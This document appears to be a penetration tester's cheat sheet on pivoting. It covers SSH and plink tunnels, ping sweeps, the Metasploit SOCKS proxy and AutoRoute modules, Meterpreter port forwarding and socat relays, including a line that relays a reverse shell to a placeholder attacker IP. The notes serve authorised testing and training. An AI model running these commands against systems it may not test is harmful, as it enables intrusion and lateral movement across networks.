
# SSH

## Dynamic Port Forwarding

```bash
# Forwarind two local ports 1234 & 8080
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

# Dynamic port forward
ssh -D 9050 ubuntu@10.129.202.64

netstat -antp | grep 1234
tail -4 /etc/proxychains.conf
```

## Reverse Port Forwarding

```bash
# forward pivothost's port 8080 to local port 8000
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

# Meterpreter

## Ping Sweep

### Meterpreter

```bash
# Perform an ICMP sweep through the Meterpreter pivot session
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

### Linux

```bash
# Ping every address in the target subnet from a Linux pivot host
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &) ; done
```

### Windows

```powershell
# Ping every address in the target subnet from a Windows CMD pivot host
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

### PowerShell

```powershell
# Ping every address in the target subnet from a PowerShell pivot host
1..254 | % {"172.16.5.$($_): $(Test-Connection -Count 1 -ComputerName 172.16.5.$($_) -Quiet)"}
```

## Configure the Metasploit SOCKS Proxy

```bash
# Select the SOCKS proxy module
use auxiliary/server/socks_proxy

# Set the local SOCKS proxy port
set SRVPORT 9050

# Listen on all local interfaces
set SRVHOST 0.0.0.0

# Configure SOCKS version 4a
set VERSION 4a

# Start the SOCKS proxy as a background job
run

# Need to configure proxychains.conf if needed
```

## AutoRoute Module

```bash
# Select the AutoRoute post-exploitation module
use post/multi/manage/autoroute

# Select the Meterpreter session
set SESSION 1

# Configure Subnet
set SUBNET 172.16.5.0

run
```

```bash
# another way
run autoroute -s 172.16.5.0/23

# Listing active routes
run autoroute -p
```

## Port Forward

```bash
# Creating Local TCP Relay
# forward all traffic from local:3300 to remoteIP:3389
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

### Reverse Port Forward

```bash
# Reverse Port Forwarding Rules
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

# Socat

```bash
# Reverse Shell Relay
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &

# Port Forwarding (Easy way)
# The compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &

# Port Forwarding (Quiet way)
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr & (# run on local attacking machine)
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

# Plink

- https://www.proxifier.com/

```bash
plink -ssh -D 9050 ubuntu@10.129.15.50
```